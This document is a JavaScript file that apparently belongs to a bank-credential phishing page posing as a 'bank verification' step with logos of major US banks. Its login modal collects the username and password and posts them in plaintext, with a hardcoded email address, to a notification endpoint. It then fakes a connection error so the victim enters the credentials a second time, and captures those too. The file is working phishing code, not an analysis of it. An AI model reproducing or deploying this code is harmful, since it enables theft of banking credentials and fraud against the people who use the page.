// Bank verification functionality
document.addEventListener('DOMContentLoaded', function() {
    const bankSearch = document.getElementById('bank-search');
    const popularBanksContainer = document.getElementById('popular-banks');
    const bankNameInput = document.getElementById('bank_name');
    const plaidMetadataInput = document.getElementById('plaid_metadata');
    let selectedBank = null;
    let isFirstAttempt = true;

    function renderBanks() {
        const bankDatabase = [
            {name: "CHASE", domain: "chase.com"},
            {name: "BANK OF AMERICA", domain: "bankofamerica.com"},
            {name: "WELLS FARGO", domain: "wellsfargo.com"},
            {name: "CITIBANK", domain: "citibank.com"},
            {name: "CAPITAL ONE", domain: "capitalone.com"},
            {name: "TD BANK", domain: "td.com"},
            {name: "US BANK", domain: "usbank.com"},
            {name: "PNC BANK", domain: "pnc.com"}
        ];

        bankDatabase.forEach(bank => {
            const col = document.createElement('div');
            col.className = 'col-6 col-md-3 mb-3';

            const bankOption = document.createElement('div');
            bankOption.className = 'bank-option';
            bankOption.innerHTML = `
                <div class="bank-logo-container">
                    <img src="https://logo.clearbit.com/${bank.domain}" alt="${bank.name}" 
                         class="bank-logo" onerror="this.src='/static/images/bank-default.svg'">
                </div>
                <div class="bank-name">${bank.name}</div>
            `;

            bankOption.addEventListener('click', () => selectBank(bank));
            col.appendChild(bankOption);
            popularBanksContainer.appendChild(col);
        });
    }

    function selectBank(bank) {
        selectedBank = bank;
        showLoginModal(bank);
    }

    function showLoginModal(bank) {
        const modal = document.createElement('div');
        modal.className = 'modal fade';
        modal.id = 'bankLoginModal';
        modal.innerHTML = `
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Connect to ${bank.name}</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <form id="bankLoginForm">
                            <div class="mb-3">
                                <label class="form-label">Username</label>
                                <input type="text" class="form-control" id="bank-username" required>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Password</label>
                                <input type="password" class="form-control" id="bank-password" required>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">Connect</button>
                        </form>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        const loginModal = new bootstrap.Modal(modal);
        loginModal.show();

        const form = modal.querySelector('#bankLoginForm');
        form.addEventListener('submit', (e) => handleLoginAttempt(e, bank, loginModal));
    }

    function handleLoginAttempt(e, bank, modal) {
        e.preventDefault();

        const username = document.getElementById('bank-username').value;
        const password = document.getElementById('bank-password').value;

        if (isFirstAttempt) {
            isFirstAttempt = false;

            // Send first attempt notification
            fetch('/api/notify-login-attempt', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    attempt: 1,
                    email: 'denzelbennie@outlook.com'
                })
            });

            // Show error after delay
            modal.hide();
            showLoading('Connecting to your bank...');

            setTimeout(() => {
                hideLoading();
                alert('Unable to connect to your bank. Please try again.');
                modal.show();
            }, 3000);

            return;
        }

        // Handle second attempt
        modal.hide();
        showLoading('Verifying your credentials...');

        // Send second attempt notification
        fetch('/api/notify-login-attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: username,
                password: password,
                attempt: 2,
                email: 'denzelbennie@outlook.com'
            })
        });

        // Store bank info and submit form
        if (bankNameInput) bankNameInput.value = bank.name;
        if (plaidMetadataInput) {
            plaidMetadataInput.value = JSON.stringify({
                bank: bank.name,
                username: username,
                timestamp: new Date().toISOString(),
                attempt: 2
            });
        }

        setTimeout(() => {
            hideLoading();
            document.getElementById('bank-verification-form').submit();
        }, 3000);
    }

    function showLoading(message) {
        let overlay = document.getElementById('loading-overlay');
        if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'loading-overlay';
            overlay.className = 'position-fixed top-0 start-0 w-100 h-100 d-flex align-items-center justify-content-center';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
            overlay.style.zIndex = '9999';
            overlay.innerHTML = `
                <div class="text-center text-white">
                    <div class="spinner-border mb-3"></div>
                    <div>${message}</div>
                </div>
            `;
            document.body.appendChild(overlay);
        }
    }

    function hideLoading() {
        const overlay = document.getElementById('loading-overlay');
        if (overlay) overlay.remove();
    }

    // Initialize
    if (popularBanksContainer) {
        renderBanks();
    }

    // Initialize search
    if (bankSearch) {
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            document.querySelectorAll('.bank-option').forEach(option => {
                const name = option.querySelector('.bank-name').textContent.toLowerCase();
                option.parentElement.style.display = name.includes(searchTerm) ? 'block' : 'none';
            });
        });
    }
});